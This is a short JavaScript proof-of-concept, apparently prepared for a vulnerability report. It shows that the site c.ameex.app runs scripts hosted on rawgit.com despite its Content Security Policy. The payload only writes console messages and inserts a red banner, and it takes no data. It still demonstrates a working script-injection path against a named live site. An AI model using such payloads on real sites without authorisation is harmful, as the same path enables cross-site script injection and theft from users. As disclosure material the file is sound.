// Proof-of-Concept: rawgit.com CSP Vulnerability
// This script proves that c.ameex.app loads code from rawgit.com

(function() {
  console.log("🔴 PROOF-OF-CONCEPT EXECUTED!");
  console.log("This code came from rawgit.com");
  console.log("It was loaded despite being from an untrusted source");
  console.log("This demonstrates the rawgit.com CSP vulnerability");
  
  // Create a visible proof on the page
  var banner = document.createElement('div');
  banner.id = 'poc-banner';
  banner.style.cssText = `
    position: fixed;
    top: 0;
    left: 0;
    right: 0;
    background: red;
    color: white;
    padding: 20px;
    font-size: 18px;
    font-weight: bold;
    z-index: 10000;
    text-align: center;
  `;
  banner.textContent = '🔴 PROOF-OF-CONCEPT: Code from rawgit.com executed successfully!';
  document.body.prepend(banner);
  
  // Log to console
  console.log("Payload executed at:", new Date().toISOString());
  console.log("This proves c.ameex.app loads code from rawgit.com");
})();
